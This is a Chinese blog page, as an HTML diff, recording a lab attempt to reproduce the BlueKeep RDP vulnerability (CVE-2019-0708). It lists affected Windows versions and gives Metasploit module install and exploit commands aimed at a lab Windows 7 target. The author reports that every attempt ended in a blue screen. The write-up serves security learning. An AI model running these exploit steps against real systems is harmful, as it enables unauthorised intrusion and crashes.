@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>CVE-2019-0708远程桌面代码执行漏洞复现 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>CVE-2019-0708远程桌面代码执行漏洞复现</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-09-08
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
+<ul>
+<li>Windows 2000 x86 (All Service Packs))</li>
+<li>Windows XP x86 (All Service Packs))</li>
+<li>Windows 2003 x86 (All Service Packs))</li>
+<li>Windows 7 x86 (All Service Packs))</li>
+<li>Windows 7 x64 (All Service Packs)</li>
+<li>Windows 2008 R2 x64 (All Service Packs)</li>
+</ul>
+</blockquote>
+<h2 id="惊现CVE-2019-0708-EXP"><a href="#惊现CVE-2019-0708-EXP" class="headerlink" title="惊现CVE-2019-0708 EXP"></a>惊现CVE-2019-0708 EXP</h2><p>​    2019年9月7日,Metasploit官方更新了<a href="https://github.com/rapid7/metasploit-framework/pull/12283?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">CVE-2019-0708的利用模块</a>,一时间各大安全媒体炸开了锅,群里好多大佬也开始转发这个消息,exploit模块的初始PR针对64位版本的Windows 7 和Windows 2008 R2,默认情况下,Metesploit中的BlueKeep漏洞仅仅识别目标操作系统版本以及目标是否可能易受攻击.该漏洞不支持自动定位,需要在攻击前手动设定目标的详细信息.<strong>如果模块在利用期间中断,或者指定了不正确的目标,那目标将会蓝屏</strong>,还应注意的是,Windows的服务器设置还需要非默认配置才能利用,即更改注册表设置以启动音频共享,将来可能会删除这个限制.</p>
+<p>所以说这个exp并不是非常的稳定,大概率会出现蓝屏的情况.</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>攻击机:Kali IP:10.10.10.129</p>
+<p>靶机:Windows 7 SP1 IP:10.10.10.128</p>
+</blockquote>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先下载攻击模块,将相应的文件移到如下文件夹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb  /usr/share/metasploit-framework/modules/exploit/windows/rdp/rdp.rb</span><br><span class="line">cp rdp_scanner.rb  /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cp cve_2019_0708_bluekeep.rb   /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb    /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>
+<p>没有的目录就自己创建一下</p>
+<p>启动msf 加载新加入的模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole				#启动</span><br><span class="line">load_all				#重新载入模块</span><br></pre></td></tr></table></figure>
+<p>选择攻击模块进行攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">set RHOST 10.10.10.128</span><br><span class="line">set target 3 				#根据实际情况进行选择</span><br><span class="line">exploit						#开始攻击</span><br></pre></td></tr></table></figure>
+<p>因为该攻击模块并不稳定,所以很容易导致靶机蓝屏,下面就是攻击失败的情况</p>
+<p>攻击开始后查看靶机的任务管理器,可以很明显的看到物理内存的使用率不断增加</p>
+<p><img src="/article/56b64430/Users\Joner\AppData\Roaming\Typora\typora-user-images\1568013185914.png" alt="1568013185914"></p>
+<p>然后一会就蓝屏了</p>
+<p><img src="/article/56b64430/1568011278013.png" alt="1568011275740"></p>
+<p>最后试了好多次,依旧是蓝屏，蓝屏漏洞，果然名不虚传，看到一些视频也是会蓝屏很多次，最后下载了个一个原版的Win7 SP1 系统，根据github上大佬的提示，修改了内核数量，最终还是一直蓝屏。</p>
+<p>还是等到exp完善后再重新复现吧。</p>
+<p>参考</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1567917255543&amp;sharer_shareid=3722e15eaec663ed9c19f08a7b498092#rd" target="_blank" rel="noopener">0708MSF攻击套件安装</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650457248&amp;idx=2&amp;sn=2c911a413c47165c1cb62dd139e1b20f&amp;chksm=83bba144b4cc2852874db504195b5619b8b03ec393b30624f40684ad47bb85a1cc6c907a3be4&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1567916787548&amp;sharer_shareid=3722e15eaec663ed9c19f08a7b498092#rd#fromHistory" target="_blank" rel="noopener">CVE_2019_0708详细复现</a></p>
+<p><a href="https://blog.csdn.net/sun1318578251/article/details/100591090" target="_blank" rel="noopener">惊现CVE-2019-0708 EXP惊醒睡梦中的安全圈</a></p>
+<p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/56b64430.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/漏洞复现/">
+              #漏洞复现
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/8a58e39c.html" target="_self">Java反序列化原理</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/eac4b7e9.html" target="_self">NEST CTF答题夺旗赛(第一季)Writeup</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
